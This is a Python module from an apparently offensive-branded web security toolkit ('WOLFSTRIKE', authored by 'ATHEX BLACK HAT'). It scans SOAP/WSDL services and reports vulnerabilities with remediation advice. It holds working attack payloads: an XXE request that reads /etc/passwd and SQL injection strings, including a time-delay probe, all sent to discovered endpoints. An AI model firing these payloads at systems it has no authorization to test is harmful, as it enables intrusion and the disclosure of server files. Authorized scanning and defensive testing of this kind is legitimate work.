# modules/api_tester/soap_tester.py

"""
SOAP API Security Tester
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Tests SOAP/WSDL web services for common vulnerabilities
including XML injection, XXE, and authentication issues.
"""

import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from urllib.parse import urljoin

import requests
from requests.exceptions import RequestException


@dataclass
class SOAPVulnerability:
    """Represents a SOAP vulnerability."""
    endpoint: str
    vulnerability_type: str
    severity: str
    description: str
    evidence: str
    remediation: str


class SOAPTester:
    """
    SOAP API security testing engine.
    
    Tests SOAP web services for vulnerabilities including
    XXE, XML injection, WSDL exposure, and authentication issues.
    """
    
    XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>"""
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the SOAP tester.
        
        Args:
            target: Target base URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'WOLFSTRIKE-SOAP-Tester/1.0',
            'Content-Type': 'text/xml; charset=utf-8',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.soap_endpoints: List[str] = []
        self.wsdl_endpoints: List[str] = []
        self.vulnerabilities: List[SOAPVulnerability] = []
        self.errors: List[str] = []
        
        self.common_soap_paths = [
            '/services/', '/webservices/', '/ws/',
            '/soap/', '/axis2/', '/cxf/',
        ]
        
        self.common_wsdl_paths = [
            '?wsdl', '.wsdl', '?WSDL',
            '/wsdl', '/service.wsdl',
        ]
    
    def discover_endpoints(self) -> List[str]:
        """
        Discover SOAP endpoints.
        
        Returns:
            List of discovered endpoint URLs
        """
        for path in self.common_soap_paths:
            url = urljoin(self.target, path)
            try:
                response = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                if response.status_code in [200, 405, 500]:
                    for wsdl_path in self.common_wsdl_paths:
                        wsdl_url = urljoin(url, wsdl_path)
                        try:
                            wsdl_response = self.session.get(
                                wsdl_url,
                                timeout=self.timeout,
                                verify=self.verify_ssl
                            )
                            
                            if wsdl_response.status_code == 200:
                                if 'wsdl' in wsdl_response.text.lower() or \
                                   'soap' in wsdl_response.text.lower() or \
                                   'xmlns:soap' in wsdl_response.text.lower():
                                    self.wsdl_endpoints.append(wsdl_url)
                                    if url not in self.soap_endpoints:
                                        self.soap_endpoints.append(url)
                        except RequestException:
                            continue
                            
            except RequestException:
                continue
        
        return self.soap_endpoints
    
    def test_wsdl_exposure(self) -> List[SOAPVulnerability]:
        """
        Test for WSDL file exposure.
        
        Returns:
            List of SOAPVulnerability objects
        """
        vulnerabilities = []
        
        for wsdl_url in self.wsdl_endpoints:
            try:
                response = self.session.get(
                    wsdl_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                if response.status_code == 200:
                    operations = self._extract_operations(response.text)
                    
                    vulnerabilities.append(SOAPVulnerability(
                        endpoint=wsdl_url,
                        vulnerability_type='WSDL Exposure',
                        severity='low',
                        description=f'WSDL file publicly accessible with {len(operations)} operations',
                        evidence=f'Operations discovered: {", ".join(operations[:5])}',
                        remediation='Restrict WSDL access to authorized users only'
                    ))
                    
            except RequestException:
                continue
        
        return vulnerabilities
    
    def _extract_operations(self, wsdl_content: str) -> List[str]:
        """
        Extract operation names from WSDL content.
        
        Args:
            wsdl_content: WSDL XML content
            
        Returns:
            List of operation names
        """
        operations = []
        
        patterns = [
            r'<wsdl:operation\s+name="([^"]+)"',
            r'<operation\s+name="([^"]+)"',
            r'name="([^"]+)"[^>]*>',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, wsdl_content, re.IGNORECASE)
            operations.extend(matches)
        
        return list(set(operations))[:20]
    
    def test_xxe_injection(self) -> List[SOAPVulnerability]:
        """
        Test for XML External Entity injection.
        
        Returns:
            List of SOAPVulnerability objects
        """
        vulnerabilities = []
        
        for endpoint in self.soap_endpoints:
            try:
                response = self.session.post(
                    endpoint,
                    data=self.XXE_PAYLOAD,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                if response.status_code in [200, 500]:
                    response_text = response.text
                    
                    xxe_indicators = [
                        'root:', '/bin/bash', '/bin/sh',
                        'daemon:', 'nobody:', 'mail:',
                    ]
                    
                    for indicator in xxe_indicators:
                        if indicator in response_text:
                            vulnerabilities.append(SOAPVulnerability(
                                endpoint=endpoint,
                                vulnerability_type='XML External Entity (XXE)',
                                severity='critical',
                                description='XXE injection allows reading server files',
                                evidence=f'File content detected in response: {indicator}',
                                remediation='Disable external entity processing in XML parser'
                            ))
                            break
                            
            except RequestException:
                continue
        
        return vulnerabilities
    
    def test_sql_injection(self) -> List[SOAPVulnerability]:
        """
        Test for SQL injection in SOAP parameters.
        
        Returns:
            List of SOAPVulnerability objects
        """
        vulnerabilities = []
        
        sqli_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "'; WAITFOR DELAY '0:0:5'--",
        ]
        
        for endpoint in self.soap_endpoints:
            for payload in sqli_payloads:
                soap_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>
      <param>{payload}</param>
    </test>
  </soap:Body>
</soap:Envelope>"""
                
                try:
                    response = self.session.post(
                        endpoint,
                        data=soap_body,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    if response.status_code == 500:
                        error_text = response.text.lower()
                        sql_error_patterns = [
                            'sql', 'syntax error', 'mysql',
                            'postgresql', 'ora-', 'sqlite',
                            'unclosed quotation',
                        ]
                        
                        for pattern in sql_error_patterns:
                            if pattern in error_text:
                                vulnerabilities.append(SOAPVulnerability(
                                    endpoint=endpoint,
                                    vulnerability_type='SQL Injection',
                                    severity='critical',
                                    description=f'SQL injection via SOAP parameter with payload: {payload}',
                                    evidence=f'SQL error in response',
                                    remediation='Implement parameterized queries and input validation'
                                ))
                                break
                                
                except RequestException:
                    continue
        
        return vulnerabilities
    
    def run(self) -> Dict[str, Any]:
        """
        Run all SOAP tests.
        
        Returns:
            Dictionary with findings and errors
        """
        self.discover_endpoints()
        
        wsdl_vulns = self.test_wsdl_exposure()
        self.vulnerabilities.extend(wsdl_vulns)
        
        xxe_vulns = self.test_xxe_injection()
        self.vulnerabilities.extend(xxe_vulns)
        
        sqli_vulns = self.test_sql_injection()
        self.vulnerabilities.extend(sqli_vulns)
        
        findings = []
        for vuln in self.vulnerabilities:
            findings.append({
                'type': vuln.vulnerability_type,
                'severity': vuln.severity,
                'endpoint': vuln.endpoint,
                'description': vuln.description,
                'evidence': vuln.evidence,
                'remediation': vuln.remediation,
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'endpoints_discovered': len(self.soap_endpoints),
            'wsdl_endpoints': len(self.wsdl_endpoints),
            'vulnerabilities_found': len(self.vulnerabilities),
        }